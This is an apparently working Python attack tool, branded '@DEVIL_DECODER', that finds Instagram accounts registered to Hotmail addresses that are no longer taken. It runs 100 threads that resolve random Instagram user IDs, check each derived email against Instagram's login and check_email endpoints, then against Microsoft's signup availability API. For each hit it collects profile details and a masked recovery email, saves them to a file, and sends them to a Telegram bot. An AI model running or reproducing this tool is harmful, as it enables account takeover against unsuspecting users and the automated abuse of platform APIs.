import os
try:
  from rich.console import Console
  from rich.live import Live
except:
  os.system("pip install rich")
  from rich.console import Console
  from rich.live import Live
try:
  import requests
except:
  os.system("pip install requests")
  import requests
try:
  from user_agent import generate_user_agent
except:
  os.system("pip install user_agent")
  from user_agent import generate_user_agent
try:
  from time import time
except:
  os.system("pip install time")
  from time import time
try:
  from hashlib import md5
except:
  os.system("pip install hashlib")
  from hashlib import md5
try:
  from uuid import uuid4
except:
  os.system("pip install uuid")
  from uuid import uuid4
try:
  from random import randrange,choice
except:
  os.system("pip install random")
  from random import randrange,choice
try:
  from concurrent.futures import ThreadPoolExecutor
except:
  os.system("pip install concurrent.futures")
  from concurrent.futures import ThreadPoolExecutor
hits = 0
bads_instgram = 0
bads_email = 0
BLUE = '''[94m'''
RESET = '''[0m'''
BOLD = '''[1m'''
YELLOW = '''[93m'''
RED = '''[91m'''
GREEN = '''[92m'''
CYAN = '''[96m'''
MAGENTA = '''[95m'''
print('\x1b[1;38;5;130m;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣤⣶⡶⠛⠉⠉⠀⣀⣀⣀⣤⣤⣤⣶⣶⣒⣛⣉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⣿⡿⠋⢀⣠⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣟⡽⣟⣫⣭⣶⣶⣿⣿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⢠⠏⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠙⠉⠁⠀⢿⣿⣿⣿⣿⡿⠿⠿⣿⡿⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡄⠀\n⠀⠀⠀⠀⠀⠀⣴⠃⠀⠀⠈⠻⠿⠿⠿⠿⠟⠛⠉⠁⠙⠿⠿⠛⠋⠉⠀⠀⠀⢀⣠⣴⣶⣾⣿⣿⣿⣿⣷⣶⣦⣙⠻⢿⣿⣿⣿⣶⣶⣶⣦⣤⣤⣴⢶⣾⠟⠀⠀\n⠀⠀⠀⠀⠀⠰⡏⣴⣄⠀⠀⠀⠀⠀⢀⣠⣴⣤⣄⣀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡉⠙⠛⠛⠛⠛⠛⠉⣉⡴⢟⣡⣴⠏⠀\n⠀⠀⠀⠀⠀⠀⠳⣿⣿⣷⣦⣀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣶⡄⠀⣀⣶⣿⣿⡿⠿⠟⠛⠛⠛⠛⠛⠛⠛⠿⣿⣿⣿⣿⣿⣿⣶⠀⠀⠀⠀⣰⣾⣷⣾⣿⡿⠃⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣣⢞⣭⠿⠋⠁⠀⠀⠀⠀⠀⠀⠠⣤⣤⣶⣾⣿⣿⣿⣯⣭⣿⣿⣶⣶⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⢿⡿⣿⣿⣿⣿⣿⣿⣿⡵⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⠀⠉⠉⠛⠿⠿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣻⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⠟⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⠀⠀⠀⠀ @DEVIL_DECODER علش |ابو ناصر @DEVIL_DECODER ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠿⣿⣿⣿⣿⣿⠟⠁⠀⣠⣶⣿⠇⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⣾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠀⠈⠻⣿⣿⡏⠀⣰⠊⠱⠛⡆⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠈⠁⠀⠀⠀⠀⣀⣀⣠⠤⠶⠶⠿⣫⠟⠁⠀⠀⠀⠈⠻⣁⣼⠗⣿⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⣀⣀⣀⣀⣈⣷⠦⠤⠶⠖⠿⣭⣁⣀⣀⣠⣶⡾⠋⠀⠀⠀⠀⠀⠀⠀⠋⠁⢠⡇⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠿⠶⣶⣾⣯⣍⣉⠉⠙⠛⣿⠁⠀⠀⠀⠀⠀⠀⠉⠛⠿⠿⠛⠀⠀⠀⠀⣤⣀⣀⠀⠀⢸⡄⠀⣠⡜⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⡏⠉⠻⢷⣶⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠤⠤⠤⢤⣄⣀⡀⠀⠀⠀⠀⠀⢿⠉⠁⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⢀⣀⣈⣼⠀⠀⠀⠀⠀⣀⣀⡴⠂⠉⠀⠀⠀⣠⢾⠁⠀⣽⠲⡄⠀⠀⠀⢸⡆⠀⠀⠀⠉⠳⢄⡀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⣴⣏⣁⠀⢻⠀⠀⢀⡴⣺⠝⠀⠀⠀⢀⣀⢶⠛⠁⠸⡄⠀⣿⠀⠹⠄⠀⠀⠈⡇⠀⠀⠀⠀⠀⠀⢙⠲⢄⡀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⢸⡇⠈⠻⣷⣾⠀⠀⣨⠟⣁⣀⣤⣴⠶⠋⠁⢸⠀⠀⠀⣷⠀⣿⠀⠀⠀⠀⠀⢠⡇⠀⠀⠀⢀⡟⠀⢸⠀⠀⠉⠒⠄\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡳⠀⠀⠙⢿⣀⡶⠉⣿⠉⠉⠉⣧⠀⠀⠀⢸⠀⠀⠀⣿⣠⣿⠀⠀⠀⠀⢀⣾⠇⠀⠀⠀⡼⠁⠀⡟⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠸⠿⣷⡀⠸⡀⠀⠀⠹⡄⠀⠀⠸⢀⣀⡴⠟⣿⠇⠀⠀⠀⠀⣾⡏⠀⠀⠀⣸⠃⠀⢰⡇⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣄⠀⠀⠀⠻⣧⣠⢧⡤⠤⠤⠿⣆⠀⠚⠉⣧⠀⢰⡿⠀⠀⠀⢀⣾⡟⠀⠀⠀⢠⠇⠀⠀⣸⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⣀⣀⢀⣤⡦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⠀⠀⣾⠉⠀⠀⣷⠀⠀⠀⢻⡀⠀⠀⢻⠀⣿⠁⠀⠀⢠⣾⡿⠀⠀⠀⢠⡞⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀\n⠀⢰⣾⣿⠷⣿⣿⠵⠖⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡀⠘⣆⠀⠀⣿⠀⠀⠀⠀⣧⠀⠀⣸⣾⠃⠀⠀⣠⣿⠟⠀⠀⠀⢀⡞⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀\n⠀⠈⡻⠉⠋⠉⢁⣤⣼⡏⢠⣆⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⣿⣶⣤⣼⣤⣀⣀⣀⡽⠶⣚⡿⠁⠀⢀⣾⣿⠋⠀⠀⠀⠀⡼⠁⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀\n⢰⣶⢟⡴⢾⢇⣏⣤⡿⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣦⠉⠉⠉⠉⠙⠛⠛⠋⠉⠉⠀⠀⣠⣿⣟⠁⠐⠒⠒⠶⡾⠁⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀\n⣸⣃⣽⣣⠜⠿⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠈⠳⡄⠀⠀⡼⠁⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀\n⠿⠉⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣳⡀⠀⠀⠀⠀⠀⢀⣴⠟⠧⣄⠀⠀⠀⠙⣦⡞⠁⠀⠀⠀⣀⣺⠴⠶⢲⡆⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⢀⣸⡏⠀⠀⠀⠀⣀⣴⡏⠀⠀⠀⠀⠀⠀⠀⢀⡠⠞⠉⠹⣄⠀⠀⠀⣠⠟⠁⠀⠀⠈⠓⣦⣀⣠⢟⠀⣠⠴⠞⠉⠁⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⢠⣶⠏⢻⣶⡶⣾⣿⣟⡯⠞⠃⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠹⣄⣠⣞⠉⠉⠉⠉⠉⠓⠲⢶⠾⠶⢿⠋⠁⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀\n⠀⠀⠈⠀⠉⠉⣉⣻⠉⠉⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠉⠉⠹⣆⠀⠀⠀⠀⠀⠀⠘⣦⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀\n⠀⠀⢀⣠⣶⠋⡽⠃⠀⢀⣀⡴⠞⠀⠀⠀⠀⠀⣀⣠⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⠀⠀⠀⠀⠀⠀⠈⣳⢶⣿⣀⠀⠀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⠀⠀\n⠀⠀⠎⠀⣼⠋⠀⠰⢊⣯⡟⠀⢀⣀⡤⠶⠒⠉⠉⠁⠀⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡄⠀⠀⠀⠀⢀⣾⠁⣸⠇⢹⠳⣄⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⣯⢉⡶⡆⣸⡉⠓⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣇⠹⡀⠀⠀⣰⠏⡾⠀⣿⠀⢸⠀⠈⣿⢦⡀⠀⢰⡇⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⢀⡿⠋⠁⠁⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⢻⣀⡜⠁⢠⠇⠀⣧⠀⢸⠀⠀⡇⠀⠙⠲⡽⠁⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠉⠀⠀⣿⠀⠀⣿⠀⢸⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⠀⠀⠀⠀⠉⠉⠛⢿⡆⢸⡇⢸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡀⠀⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠘⣧⡾⠃⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣄⠀⠀⠀⠀⠀⠀⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠿⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n\x1b[2;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
ID = input(f"{YELLOW}{BOLD}ID :  ")
token = input(f"{RED}{BOLD}Token : ")
while True:
  try:
    r=requests.post('https://signup.live.com',headers={'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',})
    mc=r.cookies.get_dict()['amsc']
    ca=str.encode(r.text.split('Canary')[4].split('","ip":"')[0].split('":"')[1]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
    break
  except:''
ids=[]
def rest(user):
  try:
    headers = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
    data = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
    'ig_sig_key_version': '4',
  }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
    r=response['email']
  except:
    r='h h h'
  return r
def info(username,jj):
  global hits
  headers = {
      'Accept': '*/*',
      'Accept-Language': 'en-US,en;q=0.9',
      'Connection': 'keep-alive',
      'DNT': '1',
      'Origin': 'https://www.tucktools.com',
      'Referer': 'https://www.tucktools.com/',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'cross-site',
      'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/124.0.0.0',
  }
  params = {
      'username': username,
  }
  hits+=1

  try:
    response = requests.get('https://instaskull.com/tucktools_user', params=params, headers=headers).json()
    id=response['id']
    name=response['user_fullname']  
    user_followers=response['user_followers']
    user_following=response['user_following']
    total_posts=response['total_posts']
    user_description=response['user_description']
    try:
      date=requests.get(f'https://alany-2-41663a9bd041.herokuapp.com/?id={str(id)}').json()['date']
    except:
      date='None'
    tlg = f'''\n⌯  @DEVIL_DECODER | @DEVIL_DECODER\nᯓᯓᯓᯓᯓᯓᯓᯓ\nمتابعين : {user_followers}\nاليتابعهم : {user_following}\nالمنشورات : {total_posts}\nيوزر: {username}\nايميل: {username}@{jj}\ndate : {date}\nايدي : {id}\nاسم: {name}\nبايو : {user_description}\nrest : {rest(username)}\nᯓᯓᯓᯓᯓᯓᯓᯓ\nby :  @DEVIL_DECODER | @DEVIL_DECODER\n'''
   # print(BLUE+tlg)
    with open('hits1.txt','a') as ff:
      ff.write(f'{tlg}\n')
    try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
    except:pass
  except:
    tlg = f'''\n    ⌯  @DEVIL_DECODER | @DEVIL_DECODER\n    ᯓᯓᯓᯓᯓᯓᯓᯓ\n    username : {username}\n    email : {username}@{jj}\n    rest : {rest(username)}\n    ᯓᯓᯓᯓᯓᯓᯓᯓ\n    by :  @DEVIL_DECODER | @DEVIL_DECODER\n    '''
  #  print(BLUE+tlg)
    try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
    except:pass
    with open('hits1.txt','a') as ff:
      ff.write(f'{tlg}\n')
def Qredes(email):
  global bads_email
  try:

    cookies = {
      'amsc':mc,

    }
    headers = {
      'authority': 'signup.live.com',
      'accept': 'application/json',
      'accept-language': 'en-US,en;q=0.9',
      'canary': ca,
      'user-agent': 'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/122.0.0.0',
    }

    json_data = {
      'signInName': email,
    }
    response = requests.post(
      'https://signup.live.com/API/CheckAvailableSigninNames',
      cookies=cookies,
      headers=headers,
      json=json_data,
    ).text
    if 'isAvailable' in response:
        username,jj=email.split('@')
        info(username,jj)
    else:bads_email+=1
  except:''
    #Qredes(email)
def check(email):
  global bads_instgram,hits,bads_email
  try:
    csrftoken = md5(str(time()).encode()).hexdigest()
    ua=generate_user_agent()
    pp=choice('001')
    os.system('clear' if os.name == 'posix' else 'cls')
    tt=(f"\r{GREEN}Hits:{GREEN} {hits} {RED}Bad instgram:{RED} {bads_instgram} {YELLOW}Email Not Available:{YELLOW} {bads_email}")
    print(tt)
    if pp == '0':
      headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/accounts/signup/email/',
        'user-agent': ua,
        'x-csrftoken': csrftoken
    }
      data = {
        'email': email,
    }
      response = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data=data)
   #   print(response.text)
      if 'email_is_taken' in str(response.text):Qredes(email)
      else:bads_instgram+=1
    elif pp == '1':
      headers = {
          'accept': '*/*',
          'accept-language': 'en-US,en;q=0.9',
          'content-type': 'application/x-www-form-urlencoded',
          'origin': 'https://www.instagram.com',
          'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
          'user-agent': ua,
          'x-csrftoken': csrftoken,
      }
      data = {
          'username': email,
      }
      response = requests.post(
          'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
          headers=headers,
          data=data,
      ).text
   #   print(str(response))
      if '"user":true' in response:Qredes(email)
      else:bads_instgram+=1
  except:''
   # check(email)
  os.system('clear' if os.name == 'posix' else 'cls')
  tt=(f"\r{GREEN}Hits:{GREEN} {hits} {RED}Bad instgram:{RED} {bads_instgram} {YELLOW}Email Not Available:{YELLOW} {bads_email}")
  print(tt)



def qqq():
  while True:
    try:
      lsd=''.join(choice('eQ6xuzk5X8j6_fGvb0gJrc') for _ in range(16))
      id=str(randrange(10000,739988755))
      headers = {
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/x-www-form-urlencoded',
      'origin': 'https://www.instagram.com',
      'referer': 'https://www.instagram.com/0s9s/',
      'user-agent': str(generate_user_agent()),
      'x-fb-lsd': 'qredes'+lsd,
  }
      data = {
      'lsd': 'qredes'+lsd,
      'variables': '{"id":"'+id+'","relay_header":false,"render_surface":"PROFILE"}',
      'doc_id': '7397388303713986',
  }
      username = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data).json()['data']['user']['username']
      email=username+'@hotmail.com'
      check(email)
    except:''
from threading import Thread
for _ in range(100):
  Thread(target=qqq).start()